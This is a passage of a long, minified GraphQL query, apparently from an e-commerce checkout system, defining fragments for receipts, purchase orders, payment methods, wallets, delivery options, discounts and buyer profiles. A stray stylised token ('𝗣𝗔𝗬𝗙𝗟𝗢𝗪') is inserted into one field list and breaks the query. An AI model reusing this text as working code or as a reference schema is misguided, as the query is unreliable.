PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderBundleLineComponent{stableId merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}buyerIdentity{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone selectedCompanyLocation{id name externalId __typename}locationCount company{id name externalId __typename}market{id handle __typename}__typename}}__typename}merchandise{merchandiseLines{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}attribution{attributions{...on AttributionItem{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...MerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...MerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment MerchandiseFragment on ProposalMerchandise{...SourceProvidedMerchandise...on ProductVariantMerchandise{id digest variantId title subtitle image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}requiresShipping properties{...MerchandiseProperties __typename}__typename}...on ContextualizedProductVariantMerchandise{id digest variantId title subtitle image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}properties{...MerchandiseProperties __typename}__typename}...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}simpleDeliveryLine{availableDeliveryStrategies{title amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePayments{paymentMethod{...on AnyDirectPaymentMethod{__typename availablePaymentProviders{paymentMethodIdentifier name brands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative __typename}}...on AnyOffsitePaymentMethod{__typename availableOffsiteProviders{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}}...on AnyCustomOnsitePaymentMethod{__typename availableCustomOnsiteProviders{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}}...on DirectPaymentMethod{__typename paymentMethodIdentifier}...on GiftCardPaymentMethod{__typename}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on AnyWalletPaymentMethod{availableWalletPaymentConfigs{...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled  𝗣𝗔𝗬𝗙𝗟𝗢𝗪  paymentIntent paymentMethodIdentifier orderingIndex}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}__typename}__typename}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on PaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier}...on CustomPaymentMethod{id name additionalDetails paymentInstructions __typename}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on NoopPaymentMethod{__typename}...on GiftCardPaymentMethod{__typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}__typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{buyerIdentity{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount 